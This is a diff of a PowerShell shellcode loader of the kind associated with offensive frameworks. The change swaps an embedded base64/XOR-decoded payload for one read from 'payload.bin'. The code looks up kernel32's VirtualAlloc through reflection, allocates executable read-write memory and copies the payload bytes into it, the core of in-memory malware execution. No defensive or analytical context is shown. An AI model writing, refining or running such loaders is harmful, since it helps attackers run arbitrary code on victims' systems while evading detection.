@@ -1,4 +1,3 @@
-
 Set-StrictMode -Version 2
 
 function func_get_delegate_type_new {
@@ -22,10 +21,7 @@ function func_get_proc_address_new {
 
 
 If ([IntPtr]::size -eq 8) {
-	[Byte[]]$acode=[System.Convert]::FromBase64String('base64')
-	for ($x = 0; $x -lt $acode.Count; $x++) {
-		$acode[$x] = $acode[$x] -bxor 0
-	}
+	[Byte[]]$acode = [System.IO.File]::ReadAllBytes('payload.bin')
 	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address_new kernel32.dll VirtualAlloc), (func_get_delegate_type_new @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
 	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)
 	[System.Runtime.InteropServices.Marshal]::Copy($acode, 0, $var_buffer, $acode.length)
